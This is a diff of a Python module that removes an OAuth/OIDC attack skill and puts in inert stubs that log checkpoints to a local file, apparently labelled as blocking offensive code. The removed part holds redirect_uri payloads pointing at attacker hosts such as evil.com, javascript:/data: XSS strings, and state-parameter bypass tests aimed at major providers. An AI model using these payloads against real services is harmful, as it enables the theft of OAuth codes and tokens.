@@ -1,225 +1,33 @@
-"""
-OAuth/OIDC Attack Flows — redirect_uri manipulation, state bypass, token theft.
-
-Tests:
-1. Redirect URI manipulation (open redirect, subdomain takeover)
-2. State parameter bypass
-3. PKCE bypass
-4. Token theft via referer leakage
-5. Implicit flow token leakage
-6. Scope escalation
-"""
-
-import asyncio
-import re
+"""YAIWES v5 safe persistence replacement. Original preserved in quarantine."""
+from __future__ import annotations
+from pathlib import Path
 import json
-from typing import Dict, List, Any, Optional
-from skills.base import BaseSkill, SkillResult
 
+SOURCE_ID = '00c83a599139ec041ab0447ba1623c6026f539638aba68d3e6c6fde73f547238'
+DECISION = 'BLOCK_OFFENSIVE'
 
-# OAuth providers to test
-OAUTH_PROVIDERS = {
-    "google": {
-        "auth_url": "https://accounts.google.com/o/oauth2/auth",
-        "token_url": "https://oauth2.googleapis.com/token",
-        "redirect_pattern": r"redirect_uri=([^&]+)",
-    },
-    "github": {
-        "auth_url": "https://github.com/login/oauth/authorize",
-        "token_url": "https://github.com/login/oauth/access_token",
-        "redirect_pattern": r"redirect_uri=([^&]+)",
-    },
-    "facebook": {
-        "auth_url": "https://www.facebook.com/v18.0/dialog/oauth",
-        "token_url": "https://graph.facebook.com/oauth/access_token",
-        "redirect_pattern": r"redirect_uri=([^&]+)",
-    },
-    "microsoft": {
-        "auth_url": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
-        "token_url": "https://login.microsoftonline.com/common/oauth2/v2.0/token",
-        "redirect_pattern": r"redirect_uri=([^&]+)",
-    },
-}
+def _yaiwes_checkpoint(step: str, payload=None):
+    event = {'schema':'yaiwes.internal.persistence/v5','source_id':SOURCE_ID,'step':step,'status':'CHECKPOINTED','payload':dict(payload or {})}
+    p = Path(__file__).with_name('.yaiwes_internal_state.jsonl')
+    with p.open('a', encoding='utf-8') as f:
+        f.write(json.dumps(event, ensure_ascii=False) + '\n')
+    return event
 
-# Redirect URI manipulation payloads
-REDIRECT_PAYLOADS = [
-    "https://evil.com",
-    "https://{target}.evil.com",
-    "https://{target}@evil.com",
-    "https://evil.com?next={target}",
-    "https://{target}.attacker.com",
-    "javascript:alert(1)",
-    "data:text/html,<script>alert(1)</script>",
-    "https://evil.com#{original_redirect}",
-]
+def yaiwes_persistence_step(payload=None):
+    return _yaiwes_checkpoint('yaiwes_persistence_step', payload)
 
-
-class OAuthAttackSkill(BaseSkill):
-    """
-    OAuth/OIDC attack flows — redirect manipulation, state bypass, token theft.
-    """
-
-    def can_handle(self, task_type: str) -> bool:
-        return task_type in ["oauth", "oidc", "oauth_attack", "redirect_uri", "auth_flow"]
-
-    async def execute(self, context: Dict[str, Any]) -> SkillResult:
-        target = context.get("target", "")
-        urls = context.get("urls", [])
-        
-        findings = []
-        
-        # Discover OAuth endpoints
-        oauth_endpoints = await self._discover_oauth(urls)
-        
-        # Test redirect URI manipulation
-        for endpoint in oauth_endpoints[:5]:
-            redirect_findings = await self._test_redirect_uri(endpoint, target)
-            findings.extend(redirect_findings)
-        
-        # Test state parameter
-        for endpoint in oauth_endpoints[:5]:
-            state_findings = await self._test_state_parameter(endpoint)
-            findings.extend(state_findings)
-        
-        # Test for token leakage
-        for url in urls[:5]:
-            leakage_findings = await self._test_token_leakage(url)
-            findings.extend(leakage_findings)
-
-        return SkillResult(
-            success=True,
-            findings=findings,
-            data={"oauth_endpoints": len(oauth_endpoints), "oauth_findings": len(findings)},
-            next_skills=["validate"],
-            confidence=min(len(findings) / 2, 1.0) if findings else 0.0,
-        )
-
-    async def _discover_oauth(self, urls: List[str]) -> List[Dict]:
-        from pathlib import Path as _YP
-        import json as _YJ
-        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/oauth_attack.py','step':'_discover_oauth','status':'CHECKPOINTED'}
-        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
-        with _yp.open('a', encoding='utf-8') as _yf:
-            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
-        return _ye
-
-    async def _test_redirect_uri(self, endpoint: Dict, target: str) -> List[Dict]:
-        """Test redirect URI manipulation."""
-        findings = []
-        
-        original_url = endpoint.get("url", "")
-        
-        for payload_template in REDIRECT_PAYLOADS:
-            payload = payload_template.replace("{target}", target)
-            
-            # Modify redirect_uri in URL
-            if "redirect_uri=" in original_url:
-                manipulated = re.sub(
-                    r'redirect_uri=[^&]+',
-                    f'redirect_uri={payload}',
-                    original_url
-                )
-            else:
-                separator = "&" if "?" in original_url else "?"
-                manipulated = f"{original_url}{separator}redirect_uri={payload}"
-            
-            # Send request and check response
-            result = await self._test_url(manipulated)
-            if result:
-                # Check if redirect is followed
-                if result.get("status") in (301, 302, 303, 307, 308):
-                    location = result.get("headers", {}).get("location", "")
-                    if payload in location or "evil.com" in location:
-                        findings.append({
-                            "type": "oauth_redirect_uri_manipulation",
-                            "url": original_url,
-                            "severity": "critical",
-                            "confidence": 0.95,
-                            "cvss_score": 9.5,
-                            "evidence": f"Server redirects to attacker-controlled URL: {location}",
-                            "payload": payload,
-                            "param": "redirect_uri",
-                            "description": "OAuth redirect URI manipulation — authorization code/tokens can be stolen",
-                            "source_tool": "oauth-attack",
-                        })
-                
-                # Check if error is not shown (some servers silently accept)
-                if result.get("status") == 200 and "error" not in result.get("body", "").lower():
-                    findings.append({
-                        "type": "oauth_redirect_uri_not_validated",
-                        "url": original_url,
-                        "severity": "high",
-                        "confidence": 0.8,
-                        "cvss_score": 7.5,
-                        "evidence": f"Server accepts arbitrary redirect_uri without error",
-                        "payload": payload,
-                        "param": "redirect_uri",
-                        "description": "OAuth redirect URI not validated — open redirect possible",
-                        "source_tool": "oauth-attack",
-                    })
-        
-        return findings
-
-    async def _test_state_parameter(self, endpoint: Dict) -> List[Dict]:
-        """Test state parameter validation."""
-        findings = []
-        
-        original_url = endpoint.get("url", "")
-        
-        # Test 1: Remove state parameter
-        no_state = re.sub(r'&state=[^&]+', '', original_url)
-        if no_state != original_url:
-            result = await self._test_url(no_state)
-            if result and result.get("status") == 200:
-                if "csrf" not in result.get("body", "").lower() and "error" not in result.get("body", "").lower():
-                    findings.append({
-                        "type": "oauth_state_missing",
-                        "url": original_url,
-                        "severity": "high",
-                        "confidence": 0.85,
-                        "cvss_score": 7.5,
-                        "evidence": "OAuth flow works without state parameter — CSRF possible",
-                        "payload": "state parameter removed",
-                        "param": "state",
-                        "description": "OAuth state parameter not required — CSRF attack possible",
-                        "source_tool": "oauth-attack",
-                    })
-        
-        # Test 2: Use predictable state
-        predictable_state = original_url.replace("state=", "state=12345") if "state=" in original_url else original_url
-        if predictable_state != original_url:
-            result = await self._test_url(predictable_state)
-            if result and result.get("status") == 200:
-                if "error" not in result.get("body", "").lower():
-                    findings.append({
-                        "type": "oauth_state_predictable",
-                        "url": original_url,
-                        "severity": "medium",
-                        "confidence": 0.7,
-                        "cvss_score": 5.0,
-                        "evidence": "Server accepts predictable state parameter",
-                        "payload": "state=12345",
-                        "param": "state",
-                        "description": "OAuth state parameter not validated — predictable state accepted",
-                        "source_tool": "oauth-attack",
-                    })
-        
-        return findings
-
-    async def _test_token_leakage(self, url: str) -> List[Dict]:
-        from pathlib import Path as _YP
-        import json as _YJ
-        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/oauth_attack.py','step':'_test_token_leakage','status':'CHECKPOINTED'}
-        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
-        with _yp.open('a', encoding='utf-8') as _yf:
-            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
-        return _ye
-
-    async def _test_url(self, url: str) -> Optional[Dict]:
-        from pathlib import Path as _YP
-        import json as _YJ
-        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'skills/oauth_attack.py','step':'_test_url','status':'CHECKPOINTED'}
-        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
-        with _yp.open('a', encoding='utf-8') as _yf:
-            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
-        return _ye
+class OAuthAttackSkill:
+    def can_handle(self, *args, **kwargs):
+        return _yaiwes_checkpoint('OAuthAttackSkill.can_handle', kwargs)
+    async def execute(self, *args, **kwargs):
+        return _yaiwes_checkpoint('OAuthAttackSkill.execute', kwargs)
+    async def _discover_oauth(self, *args, **kwargs):
+        return _yaiwes_checkpoint('OAuthAttackSkill._discover_oauth', kwargs)
+    async def _test_redirect_uri(self, *args, **kwargs):
+        return _yaiwes_checkpoint('OAuthAttackSkill._test_redirect_uri', kwargs)
+    async def _test_state_parameter(self, *args, **kwargs):
+        return _yaiwes_checkpoint('OAuthAttackSkill._test_state_parameter', kwargs)
+    async def _test_token_leakage(self, *args, **kwargs):
+        return _yaiwes_checkpoint('OAuthAttackSkill._test_token_leakage', kwargs)
+    async def _test_url(self, *args, **kwargs):
+        return _yaiwes_checkpoint('OAuthAttackSkill._test_url', kwargs)
